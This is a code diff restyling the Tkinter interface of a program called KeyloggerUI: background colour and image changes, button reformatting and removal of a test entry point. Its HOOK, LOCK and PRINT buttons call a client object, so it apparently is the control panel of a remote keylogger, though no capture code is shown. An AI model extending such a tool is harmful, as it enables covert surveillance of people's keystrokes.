@@ -37,7 +37,7 @@ def clear_textbox(textbox):
 
 class KeyloggerUI(Frame):
     def __init__(self, parent, client):
-        super().__init__(parent, bg="#008080", height=600, width=1000, bd=0, highlightthickness=0, relief="ridge")
+        super().__init__(parent, bg="#89CFF0", height=600, width=1000, bd=0, highlightthickness=0, relief="ridge")
         parent.geometry("1000x600+200+200")
         self.grid(row=0, column=0, sticky="nsew")
 
@@ -49,12 +49,24 @@ class KeyloggerUI(Frame):
         self.initialize_textbox()
         self.initialize_buttons(client)
         self.initialize_footer_image()
-
+        
     def initialize_background_image(self):
-        background_image = ImageTk.PhotoImage(Image.open(get_absolute_path("bg9.jpg")))
-        background_label = Label(self, image=background_image, bg='#40E0D0')
-        background_label.place(x=0, y=0)
+        # Open the image
+        img = Image.open(get_absolute_path("key_logger.jpg"))
 
+        # Get the size of the label or window
+        app_width, app_height = 1000, 600
+
+        # Resize the image to fit the label size
+        img = img.resize((app_width, app_height), Image.ANTIALIAS)
+
+        # Convert the resized image to PhotoImage
+        background_image = ImageTk.PhotoImage(img)
+
+        # Create a label for the background image
+        background_label = tk.Label(self, image=background_image, bg='#0F52BA')
+        background_label.place(x=0, y=0)
+        
     def initialize_textbox(self):
         self.textbox = Text(self, height=200, width=500, state="disable", wrap="char", bd=0, bg='white',
                             highlightthickness=0)
@@ -63,8 +75,7 @@ class KeyloggerUI(Frame):
     def initialize_buttons(self, client):
         self.button_hook = self.create_button('HOOK', lambda: toggle_button(client, self.button_hook, 'HOOK'), 850, 150)
         self.button_lock = self.create_button('LOCK', lambda: toggle_button(client, self.button_lock, 'LOCK'), 850, 300)
-        self.button_print = self.create_button('PRINT', lambda: send_message_and_print(client, self.textbox, 'PRINT'),
-                                               30, 150)
+        self.button_print = self.create_button('PRINT', lambda: send_message_and_print(client, self.textbox, 'PRINT'), 30, 150)
         self.button_delete = self.create_button('DELETE', lambda: clear_textbox(self.textbox), 30, 300)
         self.button_back = self.create_button('BACK', lambda: None, 740, 520)
 
@@ -120,9 +131,3 @@ class FancyButton(Button):
 
     def on_leave(self, event):
         self['bg'] = self.default_bg
-
-
-if __name__ == "__main__":
-    root = tk.Tk()
-    app = KeyloggerUI(root, None)  # Replace None with your client object
-    root.mainloop()
